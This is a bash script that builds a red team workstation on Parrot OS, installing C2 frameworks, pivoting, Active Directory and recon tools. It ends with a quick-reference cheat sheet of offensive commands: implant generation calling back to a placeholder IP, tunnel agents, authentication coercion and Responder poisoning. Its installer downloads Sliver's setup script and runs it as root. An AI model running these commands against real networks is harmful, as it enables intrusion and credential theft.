#!/usr/bin/env bash
# =============================================================================
# Parrot OS Red Team Setup Script
# =============================================================================
# Automates the full setup of a Parrot OS red team workstation:
#   - IppSec's parrot-build Ansible playbook (with known fixes applied)
#   - C2 Frameworks: AdaptixC2, Havoc, Mythic, Sliver
#   - Pivoting: Ligolo-ng, Chisel (via playbook)
#   - AD Tools: Coercer, BloodHound (native CE), Certipy, Impacket, NetExec
#   - Recon: pspy, PEASS-ng, SecLists, Kerbrute
#   - Misc: Evil-WinRM, Responder, VS Code + extensions
#
# Usage:
#   chmod +x parrot-setup.sh
#   ./parrot-setup.sh
#
# Notes:
#   - Run as your normal user (NOT root) - script uses sudo where needed
#   - Requires internet access
#   - Tested on Parrot OS (Debian trixie-based)
#   - Services are installed but NOT started (except PostgreSQL) - see end of script
#   - BloodHound is installed NATIVELY (apt package), not via Docker. The
#     playbook's Docker BloodHound task is disabled before the playbook runs.
# =============================================================================

set -e

# --- Colors ---
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
NC='\033[0m'

# --- Logging helpers ---
info()    { echo -e "${BLUE}[*]${NC} $1"; }
success() { echo -e "${GREEN}[+]${NC} $1"; }
warn()    { echo -e "${YELLOW}[!]${NC} $1"; }
fail()    { echo -e "${RED}[-]${NC} $1"; }
section() { echo -e "\n${CYAN}========================================${NC}"; echo -e "${CYAN}  $1${NC}"; echo -e "${CYAN}========================================${NC}\n"; }

# --- Pre-flight checks ---
if [ "$EUID" -eq 0 ]; then
    fail "Do not run this script as root. Run as your normal user."
    fail "The script will use sudo where needed."
    exit 1
fi

if ! command -v apt &>/dev/null; then
    fail "This script is designed for Debian-based systems (Parrot OS)."
    exit 1
fi

# Test sudo access
info "Testing sudo access (you may be prompted for your password)..."
if ! sudo -v; then
    fail "sudo access is required."
    exit 1
fi

# Keep sudo alive in the background
while true; do sudo -n true; sleep 50; done 2>/dev/null &
SUDO_PID=$!
trap "kill $SUDO_PID 2>/dev/null" EXIT

STARTTIME=$(date +%s)

# =============================================================================
# PHASE 1: System Prep & Dependencies
# =============================================================================
section "Phase 1: System Prep & Dependencies"

info "Updating package cache..."
sudo apt update -y

info "Installing base dependencies..."
# NOTE: golang-go is required by the C2 builds (Havoc go build, AdaptixC2,
# Sliver). stderr is intentionally NOT silenced so failures are visible.
sudo apt install -y \
    git curl wget jq pipx python3-pip python3-venv \
    build-essential gcc g++ make cmake golang-go \
    ca-certificates gnupg lsb-release openssl \
    ansible

# Ensure pipx is on PATH
export PATH="$HOME/.local/bin:$PATH"
# Guard on the exact line we add (.local/bin), otherwise it gets appended every run.
if ! grep -q '.local/bin' "$HOME/.bashrc" 2>/dev/null; then
    echo 'export PATH="$HOME/.local/bin:$PATH"' >> "$HOME/.bashrc"
fi

success "Base dependencies installed."

# =============================================================================
# PHASE 2: IppSec's parrot-build Playbook (with fixes)
# =============================================================================
section "Phase 2: IppSec's parrot-build Playbook"

PLAYBOOK_DIR="$HOME/parrot-build"

if [ -d "$PLAYBOOK_DIR" ]; then
    warn "parrot-build directory already exists at $PLAYBOOK_DIR"
    warn "Skipping clone - using existing directory."
else
    info "Cloning IppSec's parrot-build playbook..."
    git clone https://github.com/IppSec/parrot-build.git "$PLAYBOOK_DIR"
    success "Playbook cloned."
fi

cd "$PLAYBOOK_DIR"

# --- Install Ansible dependencies ---
info "Installing Ansible Galaxy roles..."
ansible-galaxy install -r requirements.yml 2>/dev/null || \
    ansible-galaxy install gantsign.visual-studio-code 2>/dev/null || true
success "Ansible dependencies installed."

# --- Fix 1: apt-key removal (Parrot/Debian trixie removed apt-key) ---
info "Applying Fix 1: Patching deprecated apt_key usage for Docker GPG key..."

APT_TASKS="roles/install-tools/tasks/apt-stuff.yml"
if grep -q "apt_key" "$APT_TASKS" 2>/dev/null; then
    # Get line numbers of the old apt_key and apt_repository tasks.
    # IMPORTANT: scope the end to the FIRST "state: present" at/after the keyring
    # task, NOT the last one in the file (tail -1 could delete unrelated tasks).
    APT_KEY_START=$(grep -n "Add Docker keyring" "$APT_TASKS" | head -1 | cut -d: -f1)
    APT_REPO_END=$(awk -v s="${APT_KEY_START:-0}" 'NR>=s && /state: present/{print NR; exit}' "$APT_TASKS")

    if [ -n "$APT_KEY_START" ] && [ -n "$APT_REPO_END" ]; then
        # Find the update_cache line that follows
        NEXT_LINE=$((APT_REPO_END + 1))
        if sed -n "${NEXT_LINE}p" "$APT_TASKS" | grep -q "update_cache"; then
            APT_REPO_END=$NEXT_LINE
        fi

        # Delete the old tasks
        sed -i "${APT_KEY_START},${APT_REPO_END}d" "$APT_TASKS"

        # Insert the modern replacement
        sed -i "$((APT_KEY_START - 1))a\\
\\
- name: \"Create keyrings directory\"\\
  file:\\
    path: /etc/apt/keyrings\\
    state: directory\\
    mode: '0755'\\
  become: true\\
  become_method: sudo\\
\\
- name: \"Add Docker keyring to apt\"\\
  shell: |\\
    curl -fsSL https://download.docker.com/linux/debian/gpg | gpg --dearmor -o /etc/apt/keyrings/docker.gpg\\
    chmod a+r /etc/apt/keyrings/docker.gpg\\
  args:\\
    creates: /etc/apt/keyrings/docker.gpg\\
  become: true\\
  become_method: sudo\\
\\
- name: \"Install Docker Repository\"\\
  apt_repository:\\
    repo: \"deb [arch=amd64 signed-by=/etc/apt/keyrings/docker.gpg] https://download.docker.com/linux/debian {{ ansible_distribution_release }} stable\"\\
    state: present\\
    update_cache: yes\\
  become: true\\
  become_method: sudo" "$APT_TASKS"

        success "Patched apt_key -> modern signed-by method."
    else
        warn "Could not locate apt_key task lines. Attempting alternative fix..."
        # Alternative: just replace apt_key module calls inline
        sed -i 's/apt_key:/shell: "curl -fsSL https:\/\/download.docker.com\/linux\/debian\/gpg | gpg --dearmor -o \/etc\/apt\/keyrings\/docker.gpg"/g' "$APT_TASKS"
    fi
else
    success "apt_key fix already applied or not needed."
fi

# --- Fix 2: Disable the playbook's Docker BloodHound (native install used instead) ---
info "Applying Fix 2: Disabling the playbook's Docker BloodHound task..."

BH_TASKS="roles/install-tools/tasks/bloodhound.yml"
if [ -f "$BH_TASKS" ]; then
    cat > "$BH_TASKS" <<'YAML'
---
# Docker BloodHound install intentionally disabled by parrot-setup.sh.
# Native BloodHound (apt package) is installed and configured later in this
# script instead, to avoid running BloodHound inside Docker.
- name: "BloodHound (Docker) skipped - native install handled by parrot-setup.sh"
  ansible.builtin.debug:
    msg: "Skipping Docker BloodHound; native BloodHound is installed separately."
YAML
    success "Playbook Docker BloodHound disabled (native install will be used)."
else
    warn "bloodhound.yml not found - playbook layout may have changed; skipping."
fi

# --- Run the playbook ---
info "Running the Ansible playbook..."
info "This will install: Docker, Chisel, PEASS-ng, Chainsaw, SecLists,"
info "SharpCollection, Impacket, NetExec, Certipy, Evil-WinRM, Kerbrute,"
info "Tmux config, Bashrc, Burp Suite CA, Firefox policies, UFW + Auditd/Laurel"
info "logging, VS Code + extensions, and more. (BloodHound is installed natively.)"
echo ""
warn "You may be prompted for your sudo password by Ansible."
echo ""

# Run with -K to prompt for become password
ansible-playbook main.yml -K || {
    ANSIBLE_EXIT=$?
    if [ $ANSIBLE_EXIT -ne 0 ]; then
        warn "Playbook exited with code $ANSIBLE_EXIT."
        warn "Common issues:"
        warn "  - A transient download/health-check failure: just re-run the script"
        warn ""
        warn "You can resume from a failed task with:"
        warn "  cd $PLAYBOOK_DIR && ansible-playbook main.yml -K"
        warn ""
        read -p "Continue with additional tool installations? [Y/n] " -n 1 -r
        echo
        if [[ $REPLY =~ ^[Nn]$ ]]; then
            exit 1
        fi
    fi
}

success "Ansible playbook completed."

# Return to a stable working directory before the remaining phases.
cd "$HOME"

# =============================================================================
# Native BloodHound CE (replaces the Docker stack)
# =============================================================================
section "Native BloodHound CE"

CYPHER="/usr/share/neo4j/bin/cypher-shell"

info "Installing native BloodHound, the Python ingestor, and neo4j..."
sudo apt install -y bloodhound bloodhound.py neo4j

# Internal neo4j password (bhapi <-> neo4j, bound to loopback only).
NEO4J_PASS=$(openssl rand -hex 16)

info "Preparing PostgreSQL + BloodHound database..."
sudo systemctl enable --now postgresql
sudo runuser -u postgres -- /usr/share/bloodhound/create-database-bloodhound

# Set the neo4j password to $NEO4J_PASS. Resilient to an already-initialised
# DB: neo4j-admin can't be used on this box (the system JDK is too new for
# neo4j 4.4 -> "Unrecognized VM option 'UseBiasedLocking'"), so we change the
# password over bolt, and if neo4j was already set up with an unknown password
# we reset the system database (users/roles only - the empty graph DB is
# untouched) and retry against the default neo4j/neo4j.
set_neo4j_password() {
    sudo neo4j start >/dev/null 2>&1 || true
    info "  Waiting for neo4j to accept connections..."
    for _ in $(seq 1 40); do curl -s http://localhost:7474 >/dev/null 2>&1 && break; sleep 3; done

    if "$CYPHER" -a neo4j://localhost:7687 -u neo4j -p neo4j -d system \
        "ALTER CURRENT USER SET PASSWORD FROM 'neo4j' TO '$NEO4J_PASS';" >/dev/null 2>&1; then
        return 0
    fi

    warn "  neo4j already initialised - resetting auth (system DB only)..."
    sudo neo4j stop >/dev/null 2>&1 || true
    sudo rm -rf /etc/neo4j/data/databases/system /etc/neo4j/data/transactions/system
    sudo neo4j start >/dev/null 2>&1 || true
    for _ in $(seq 1 40); do curl -s http://localhost:7474 >/dev/null 2>&1 && break; sleep 3; done
    "$CYPHER" -a neo4j://localhost:7687 -u neo4j -p neo4j -d system \
        "ALTER CURRENT USER SET PASSWORD FROM 'neo4j' TO '$NEO4J_PASS';" >/dev/null 2>&1
}

info "Setting neo4j password..."
if set_neo4j_password && \
   "$CYPHER" -a neo4j://localhost:7687 -u neo4j -p "$NEO4J_PASS" "RETURN 1;" >/dev/null 2>&1; then
    success "neo4j password configured."
else
    warn "Could not set the neo4j password automatically."
    warn "Set it manually (cypher-shell) and update /etc/bhapi/bhapi.json before running bloodhound."
fi

# Point bhapi at the neo4j password. The launcher refuses to start while the
# config still has the default neo4j secret ("secret": "neo4j").
info "Updating /etc/bhapi/bhapi.json with the neo4j password..."
sudo sed -i "s/\"secret\": \"neo4j\"/\"secret\": \"$NEO4J_PASS\"/" /etc/bhapi/bhapi.json

# Honour the "installed but not started" contract - free the RAM until needed.
sudo neo4j stop >/dev/null 2>&1 || true

success "Native BloodHound installed and configured."
info "  Start it with: sudo bloodhound"
info "  UI: http://127.0.0.1:8080  (login admin/admin; first run builds ~230 neo4j indexes, ~5 min)"

# =============================================================================
# PHASE 3: C2 Frameworks
# =============================================================================
section "Phase 3: C2 Frameworks"

# --- AdaptixC2 ---
info "Installing AdaptixC2..."
if [ ! -d "/opt/AdaptixC2/.git" ]; then
    sudo git clone https://github.com/Adaptix-Framework/AdaptixC2.git /opt/AdaptixC2
    cd /opt/AdaptixC2
    sudo bash pre_install_linux_all.sh server 2>&1 | tail -5
    sudo make server-ext 2>&1 | tail -5
    success "AdaptixC2 installed at /opt/AdaptixC2/dist/"
else
    success "AdaptixC2 already installed."
fi

# --- Havoc ---
info "Installing Havoc C2..."
if [ ! -f "/opt/Havoc/havoc" ]; then
    if [ ! -d "/opt/Havoc/.git" ]; then
        sudo git clone https://github.com/HavocFramework/Havoc.git /opt/Havoc
    fi
    cd /opt/Havoc
    # Install teamserver deps
    sudo bash teamserver/Install.sh 2>/dev/null || true
    # Build teamserver
    cd /opt/Havoc/teamserver
    sudo GO111MODULE=on go build -ldflags="-s -w" -o ../havoc main.go 2>&1 | tail -5
    sudo setcap 'cap_net_bind_service=+ep' /opt/Havoc/havoc 2>/dev/null || true
    success "Havoc teamserver installed at /opt/Havoc/havoc"
else
    success "Havoc already installed."
fi

# --- Mythic ---
info "Installing Mythic C2..."
if [ ! -f "/opt/Mythic/mythic-cli" ]; then
    if [ ! -d "/opt/Mythic/.git" ]; then
        sudo git clone https://github.com/its-a-feature/Mythic.git /opt/Mythic
    fi
    cd /opt/Mythic
    sudo make 2>&1 | tail -5

    # Fix postgres config permissions (known issue)
    sudo chmod 644 /opt/Mythic/postgres-docker/postgres.conf 2>/dev/null || true
    sudo chmod 644 /opt/Mythic/postgres-docker/pg_hba.conf 2>/dev/null || true

    success "Mythic installed at /opt/Mythic/"
    info "  Start with: cd /opt/Mythic && sudo ./mythic-cli start"
    info "  Install agents: sudo ./mythic-cli install github https://github.com/MythicAgents/poseidon"
else
    success "Mythic already installed."
fi

# --- Sliver (if not already installed) ---
info "Checking Sliver..."
if ! command -v sliver-server &>/dev/null; then
    info "Installing Sliver C2..."
    # Download first (curl -f fails on HTTP errors so we never pipe a bad
    # response straight into root's shell), then run. Inspect the file if desired.
    curl -fsSL https://sliver.sh/install -o /tmp/sliver-install.sh
    sudo bash /tmp/sliver-install.sh 2>&1 | tail -5
    rm -f /tmp/sliver-install.sh
    success "Sliver installed."
else
    success "Sliver already installed: $(command -v sliver-server)"
fi

# =============================================================================
# PHASE 4: Pivoting & Tunneling
# =============================================================================
section "Phase 4: Pivoting & Tunneling"

# --- Ligolo-ng ---
info "Installing Ligolo-ng..."
if [ ! -f "/opt/ligolo-ng/proxy" ]; then
    sudo mkdir -p /opt/ligolo-ng
    LIGOLO_VER=$(curl -sI https://github.com/nicocha30/ligolo-ng/releases/latest | grep -i location | sed 's/.*tag\///;s/\r//' || true)
    if [ -z "$LIGOLO_VER" ]; then
        fail "Could not resolve the latest Ligolo-ng version (GitHub redirect format may have changed)."
        warn "Skipping Ligolo-ng - install it manually from https://github.com/nicocha30/ligolo-ng/releases"
    else
        info "  Latest version: $LIGOLO_VER"
        sudo curl -sL "https://github.com/nicocha30/ligolo-ng/releases/download/${LIGOLO_VER}/ligolo-ng_proxy_${LIGOLO_VER#v}_linux_amd64.tar.gz" -o /tmp/ligolo-proxy.tar.gz
        sudo curl -sL "https://github.com/nicocha30/ligolo-ng/releases/download/${LIGOLO_VER}/ligolo-ng_agent_${LIGOLO_VER#v}_linux_amd64.tar.gz" -o /tmp/ligolo-agent.tar.gz
        sudo tar xzf /tmp/ligolo-proxy.tar.gz -C /opt/ligolo-ng/
        sudo tar xzf /tmp/ligolo-agent.tar.gz -C /opt/ligolo-ng/
        rm -f /tmp/ligolo-proxy.tar.gz /tmp/ligolo-agent.tar.gz
        success "Ligolo-ng installed at /opt/ligolo-ng/"
    fi
else
    success "Ligolo-ng already installed."
fi

# =============================================================================
# PHASE 5: AD & Exploitation Tools
# =============================================================================
section "Phase 5: AD & Exploitation Tools"

# --- Coercer ---
info "Installing Coercer..."
if ! command -v coercer &>/dev/null; then
    pipx install coercer 2>&1 | tail -3
    success "Coercer installed."
else
    success "Coercer already installed."
fi

# =============================================================================
# PHASE 6: Recon & Post-Exploitation
# =============================================================================
section "Phase 6: Recon & Post-Exploitation"

# --- pspy ---
info "Installing pspy..."
if [ ! -f "/opt/pspy/pspy64" ]; then
    sudo mkdir -p /opt/pspy
    sudo curl -sL https://github.com/DominicBreuker/pspy/releases/latest/download/pspy64 -o /opt/pspy/pspy64
    sudo curl -sL https://github.com/DominicBreuker/pspy/releases/latest/download/pspy32 -o /opt/pspy/pspy32
    sudo chmod +x /opt/pspy/pspy64 /opt/pspy/pspy32
    success "pspy installed at /opt/pspy/"
else
    success "pspy already installed."
fi

# =============================================================================
# PHASE 7: Verification
# =============================================================================
section "Phase 7: Verification"

PASS=0
FAIL=0

check_tool() {
    local name="$1"
    local check="$2"
    if eval "$check" &>/dev/null; then
        success "$name"
        PASS=$((PASS + 1))
    else
        fail "$name - NOT FOUND"
        FAIL=$((FAIL + 1))
    fi
}

echo ""
info "Checking all installed tools..."
echo ""

# Playbook tools
check_tool "Docker"            "command -v docker"
check_tool "Impacket"          "pipx list 2>/dev/null | grep -q impacket"
check_tool "NetExec"           "pipx list 2>/dev/null | grep -q netexec"
check_tool "Certipy"           "pipx list 2>/dev/null | grep -q certipy"
check_tool "Evil-WinRM"        "command -v evil-winrm"
check_tool "Chisel"            "ls /opt/chisel/chisel* 2>/dev/null"
check_tool "PEASS-ng"          "ls /opt/peas/linpeas.sh 2>/dev/null"
check_tool "SecLists"          "ls /opt/SecLists/README.md 2>/dev/null"
check_tool "SharpCollection"   "ls /opt/SharpCollection/README.md 2>/dev/null"
check_tool "Chainsaw"          "ls /opt/chainsaw* 2>/dev/null"
check_tool "VS Code"           "command -v code"
check_tool "Responder"         "command -v responder"

# Native BloodHound
check_tool "BloodHound (native)"  "command -v bloodhound"
check_tool "neo4j"                "command -v neo4j"
check_tool "BloodHound Python"    "command -v bloodhound-python"

# C2 Frameworks
check_tool "AdaptixC2"         "ls /opt/AdaptixC2/dist/adaptixserver 2>/dev/null"
check_tool "Havoc"             "ls /opt/Havoc/havoc 2>/dev/null"
check_tool "Mythic"            "ls /opt/Mythic/mythic-cli 2>/dev/null"
check_tool "Sliver"            "command -v sliver-server"

# Additional tools
check_tool "Ligolo-ng"         "ls /opt/ligolo-ng/proxy 2>/dev/null"
check_tool "Coercer"           "command -v coercer"
check_tool "pspy"              "ls /opt/pspy/pspy64 2>/dev/null"

echo ""
echo -e "${GREEN}Passed: $PASS${NC}  ${RED}Failed: $FAIL${NC}"

# =============================================================================
# Summary & Quick Reference
# =============================================================================
section "Setup Complete!"

ELAPSED=$(( $(date +%s) - STARTTIME ))
MINS=$(( ELAPSED / 60 ))
SECS=$(( ELAPSED % 60 ))
info "Total time: ${MINS}m ${SECS}s"
echo ""

# Save credentials file
CREDS_FILE="$HOME/red-team-creds.txt"
cat > "$CREDS_FILE" << 'CREDS'
# =============================================================================
# Red Team Credentials & Quick Reference
# =============================================================================

## Mythic
# Creds: cd /opt/Mythic && cat .env | grep MYTHIC_ADMIN
# Web UI: https://localhost:7443
# Start: cd /opt/Mythic && sudo ./mythic-cli start
# Install agent: sudo ./mythic-cli install github https://github.com/MythicAgents/poseidon
# Install C2:    sudo ./mythic-cli install github https://github.com/MythicC2Profiles/http

## AdaptixC2
# Start: cd /opt/AdaptixC2/dist && sudo bash ssl_gen.sh && sudo ./adaptixserver -p profile.yaml
# Config: cat /opt/AdaptixC2/dist/profile.yaml

## Havoc
# Start: cd /opt/Havoc && sudo ./havoc server --profile profiles/havoc.yaotl
# Config: cat /opt/Havoc/profiles/havoc.yaotl

## Sliver
# Start: sliver-server
# Generate: generate --mtls YOUR_IP --os windows
# Listeners: mtls / http / dns -d yourdomain.com

## Ligolo-ng
# Proxy:  sudo /opt/ligolo-ng/proxy -selfcert -laddr 0.0.0.0:11601
# Agent:  ./agent -connect PROXY_IP:11601 -ignore-cert
# Route:  sudo ip route add TARGET_SUBNET dev ligolo

## Coercer
# Scan:   coercer scan -t TARGET -u USER -p PASS -d DOMAIN
# Coerce: coercer coerce -t TARGET -l YOUR_IP -u USER -p PASS -d DOMAIN

## Responder
# Start: sudo responder -I eth0 -dwPv

## pspy (transfer to target)
# Run: ./pspy64         (64-bit)
# Run: ./pspy32         (32-bit)
# Fast: ./pspy64 -i 100  (100ms polling)

CREDS

# BloodHound (native) - appended separately so the generated neo4j password is included.
cat >> "$CREDS_FILE" << EOF
## BloodHound (native CE)
# Web UI: http://127.0.0.1:8080    login: admin / admin  (forces a password change on first login)
# Start:  sudo bloodhound           (first run builds ~230 neo4j indexes, ~5 min)
# neo4j:  neo4j / $NEO4J_PASS        (bolt localhost:7687)
# Config: /etc/bhapi/bhapi.json

EOF

success "Credentials & quick reference saved to: $CREDS_FILE"
echo ""
info "Services are installed but NOT running (PostgreSQL is enabled for BloodHound)."
info "Start them individually as needed using the commands in $CREDS_FILE"
echo ""
warn "Native BloodHound (neo4j + bhapi) and Mythic are both RAM-hungry."
warn "Stop BloodHound's neo4j ('sudo neo4j stop') before starting Mythic if low on RAM."
echo ""
success "Your Parrot OS red team workstation is ready!"
